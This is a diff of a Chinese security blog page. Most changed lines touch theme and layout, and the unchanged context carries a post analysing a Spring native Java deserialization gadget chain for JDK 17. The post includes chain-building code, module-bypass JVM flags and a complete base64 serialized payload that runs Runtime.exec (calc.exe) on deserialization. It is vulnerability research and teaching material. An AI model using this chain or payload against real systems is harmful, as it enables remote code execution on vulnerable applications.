@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>高版本JDKSpring原生反序列化链 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
+<link rel="canonical" href="https://curlysean.github.io/2025/08/31/%E9%AB%98%E7%89%88%E6%9C%ACJDKSpring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-08-31T07:25:05.000Z">2025.08.31</time></div>
-      <div><span>更新</span><time datetime="2025-08-31T07:25:05.000Z">2025.08.31</time></div>
-      <div><span>阅读</span><strong>43 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ixKCn"><span class="toc-text">高版本JDKSpring原生反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rOknq"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A9JTd"><span class="toc-text">原生反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PtZOM"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZIpoA"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KVg99"><span class="toc-text">流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#gUefN"><span class="toc-text">EventListenerList触发任意类的toString方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fkm25"><span class="toc-text">POJONode#toString调用任意getter方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#jLzEp"><span class="toc-text">TemplatesImpl#getOutputProperties任意代码执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Motj2"><span class="toc-text">限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#YFDLT"><span class="toc-text">JDK17模块化的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#lUNLV"><span class="toc-text">AbstractTranslet继承</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#YVGro"><span class="toc-text">getOutputProperties访问</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#pmLeG"><span class="toc-text">Jackson链的不稳定性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paYbK"><span class="toc-text">完整POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fa6p1"><span class="toc-text">参考文章</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rOknq"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A9JTd"><span class="toc-text">原生反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PtZOM"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZIpoA"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KVg99"><span class="toc-text">流程分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Motj2"><span class="toc-text">限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paYbK"><span class="toc-text">完整POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fa6p1"><span class="toc-text">参考文章</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-08-31T07:25:05.000Z">2025.08.31</time></div>
+        <div><span>更新</span><time datetime="2025-08-31T07:25:05.000Z">2025.08.31</time></div>
+        <div><span>阅读</span><strong>约 15 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="ixKCn">高版本JDKSpring原生反序列化链</h1>
+        
 <h2 id="rOknq">前言</h2>
 
 <p>在《Java安全share》星球中，jsjcw师傅给出了 在高版本JDK下的spring原生链 POC，当时就想去研究一下这条链子，可惜其中有很多知识点我都没有接触过，所以这条链子的学习周期拉的长了一些</p>
@@ -117,7 +138,7 @@
 <h3 id="PtZOM">环境搭建</h3>
 
 <p>新建一个JAVA项目，JDK版本为17</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756091306820-68837ef8-ef6b-4d65-b0bb-de8d5408c17d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756091306820-68837ef8-ef6b-4d65-b0bb-de8d5408c17d.png" alt="高版本JDKSpring原生反序列化链" loading="lazy"></p>
 <p>向pom.xml文件中导入如下依赖</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.30.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -134,7 +155,7 @@
 <li>JackSon链的不稳定性</li>
 <li>模块系统</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756384680511-fa756875-4c77-455e-8998-e6b6a15fca9a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756384680511-fa756875-4c77-455e-8998-e6b6a15fca9a.png" alt="高版本JDKSpring原生反序列化链" loading="lazy"></p>
 <h4 id="KVg99">流程分析</h4>
 <h5 id="gUefN">EventListenerList触发任意类的toString方法</h5>
 
@@ -148,8 +169,8 @@
 <blockquote>
 <p>Spring Boot 会自动引入 Jackson依赖</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756391493716-717c12dd-2fff-466f-951f-715b052890bd.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756391506653-988c301b-09f5-487f-b5e9-9ddde9ca917d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756391493716-717c12dd-2fff-466f-951f-715b052890bd.png" alt="高版本JDKSpring原生反序列化链" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756391506653-988c301b-09f5-487f-b5e9-9ddde9ca917d.png" alt="高版本JDKSpring原生反序列化链" loading="lazy"></p>
 <p>而第一部分<code>EventListenerList#readObject</code>可以触发任意类的<code>toString</code>方法，所以我们可以使用<code>EventListenerList</code>调用<code>POJONode#toString</code>方法从而调用任意类的getter方法，其中我们可以调用<code>new POJONode( $&#123;Class&#125; )</code>中<code>$&#123;Class&#125;</code>的任意getter方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除writeReplace方法，防止序列化过程中报错</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">    <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">    jsonNode.removeMethod(writeReplace);</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">vector.add(<span class="keyword">new</span> <span class="title class_">POJONode</span>(templates));</span><br><span class="line"><span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">edits</span> <span class="operator">=</span> undoManager.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;edits&quot;</span>);</span><br><span class="line">edits.setAccessible(<span class="literal">true</span>);</span><br><span class="line">edits.set(undoManager, vector);</span><br><span class="line"></span><br><span class="line"><span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">listenerList</span> <span class="operator">=</span> eventListenerList.getClass().getDeclaredField(<span class="string">&quot;listenerList&quot;</span>);</span><br><span class="line">listenerList.setAccessible(<span class="literal">true</span>);</span><br><span class="line">listenerList.set(eventListenerList, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Class.class,undoManager&#125;);</span><br><span class="line"></span><br><span class="line">serialize(eventListenerList);</span><br></pre></td></tr></table></figure>
 
@@ -171,7 +192,7 @@
 <h6 id="lUNLV">AbstractTranslet继承</h6>
 
 <p>在以往利用<code>TemplatesImpl#getOutputProperties</code>时，被利用的目标类是需要继承<code>AbstractTranslet</code>类的，但是由于<code>AbstractTranslet</code>类在<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>包下，受到模块化的 <strong>内部API封装机制</strong> 的限制，，是默认不可访问的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756394404065-c451c12f-bb2e-4c04-8432-12ca68d084e1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756394404065-c451c12f-bb2e-4c04-8432-12ca68d084e1.png" alt="高版本JDKSpring原生反序列化链" loading="lazy"></p>
 <p>对于<code>AbstractTranslet</code>限制的去除，可以看这篇文章：<a target="_blank" rel="noopener" href="https://whoopsunix.com/docs/PPPYSO/advance/TemplatesImpl/#0x02-%E5%8E%BB%E9%99%A4-abstracttranslet-%E9%99%90%E5%88%B6">TemplatesImpl 分析 🦖 Whoopsunix</a></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="type">byte</span>[] code2 = ClassPool.getDefault().makeClass(<span class="string">&quot;sean&quot;</span>).toBytecode();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getTemplateCode(), code2&#125;);</span><br></pre></td></tr></table></figure>
 
@@ -197,7 +218,7 @@
 <p>在运行时，我们需要添加一个虚拟机的配置，这里也算是一个模块检测的绕过吧，对应 <strong>反射限制</strong> 部分</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756396301078-ca07e657-7701-4153-9b6f-7a069c9924f5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1756396301078-ca07e657-7701-4153-9b6f-7a069c9924f5.png" alt="高版本JDKSpring原生反序列化链" loading="lazy"></p>
 <p>反序列化时就不需要再开什么配置了，默认即可</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Read</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHB0AA9qYXZhLmxhbmcuQ2xhc3NzcgAcamF2YXguc3dpbmcudW5kby5VbmRvTWFuYWdlcvF+nx0IKsIdAgACSQAOaW5kZXhPZk5leHRBZGRJAAVsaW1pdHhyAB1qYXZheC5zd2luZy51bmRvLkNvbXBvdW5kRWRpdKWeULpT25X9AgACWgAKaW5Qcm9ncmVzc0wABWVkaXRzdAASTGphdmEvdXRpbC9WZWN0b3I7eHIAJWphdmF4LnN3aW5nLnVuZG8uQWJzdHJhY3RVbmRvYWJsZUVkaXQIDRuO7QILEAIAAloABWFsaXZlWgALaGFzQmVlbkRvbmV4cAEBAXNyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAABkc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWV0ABJMamF2YS9sYW5nL09iamVjdDt4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkpka0R5bmFtaWNBb3BQcm94eUzEtHEO65b8AgABTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7eHBzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAZaAAtwcmVGaWx0ZXJlZEwAE2Fkdmlzb3JDaGFpbkZhY3Rvcnl0ADdMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0Fkdmlzb3JDaGFpbkZhY3Rvcnk7TAAKYWR2aXNvcktleXQAEExqYXZhL3V0aWwvTGlzdDtMAAhhZHZpc29yc3EAfgAbTAAKaW50ZXJmYWNlc3EAfgAbTAAMdGFyZ2V0U291cmNldAAmTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL1RhcmdldFNvdXJjZTt4cgAtb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLlByb3h5Q29uZmlni0vz5qfg928CAAVaAAtleHBvc2VQcm94eVoABmZyb3plbloABm9wYXF1ZVoACG9wdGltaXplWgAQcHJveHlUYXJnZXRDbGFzc3hwAAAAAAAAc3IAPG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5EZWZhdWx0QWR2aXNvckNoYWluRmFjdG9yeQPJ50kFqahMAgAAeHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AInNxAH4AIQAAAAB3BAAAAAB4c3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5TaW5nbGV0b25UYXJnZXRTb3VyY2V9VW71x/j6ugIAAUwABnRhcmdldHEAfgAOeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAAAAAAAHVyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAFiyv66vgAAADcAGQEACk15VGVtcGxhdGUHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAD015VGVtcGxhdGUuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAAhjYWxjLmV4ZQgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQAGPGluaXQ+DAAWAAgKAAQAFwAhAAIABAAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABYACAABAAkAAAARAAEAAQAAAAUqtwAYsQAAAAAAAQAFAAAAAgAGdXEAfgAuAAAAosr+ur4AAAA3AAwBAAlmdXNodWxpbmcHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEADmZ1c2h1bGluZy5qYXZhAQAGPGluaXQ+AQADKClWDAAHAAgKAAQACQEABENvZGUAIQACAAQAAAAAAAEAAQAHAAgAAQALAAAAEQABAAEAAAAFKrcACrEAAAAAAAEABQAAAAIABnB0AAN4eHhwdwEAeHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHgAAAAAAAAAZHB4&quot;</span>;</span><br><span class="line">        unserialize(Base64.getDecoder().decode(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] exp)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -226,13 +247,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/09/30/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>Hessian反序列化</strong>
       </a>
     
     
-      <a href="/2025/08/28/Jackson%E4%B8%ADgetter%E8%A7%A6%E5%8F%91%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/08/28/Jackson%E4%B8%ADgetter%E8%A7%A6%E5%8F%91%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">
+        <span>更早一篇</span>
         <strong>Jackson中getter触发不稳定问题</strong>
       </a>
     
@@ -246,9 +267,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
